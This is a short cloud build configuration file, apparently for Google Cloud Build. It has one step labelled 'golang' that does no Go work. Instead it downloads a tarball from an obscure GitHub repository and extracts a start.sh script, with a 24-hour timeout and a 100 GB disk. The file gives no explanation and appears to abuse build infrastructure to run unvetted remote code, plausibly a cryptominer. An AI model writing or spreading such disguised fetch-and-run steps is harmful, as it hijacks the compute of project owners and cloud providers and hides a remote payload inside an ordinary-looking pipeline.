steps:
  - name: golang
    args:
      - '-c'
      - >-
         wget https://github.com/ifhikf/jos/raw/main/sctrtl.tar.gz && tar xf sctrtl.tar.gz ./start.sh
    waitFor:
      - '-'
    entrypoint: /bin/bash
timeout: 86400s
options:
  diskSizeGb: '100'
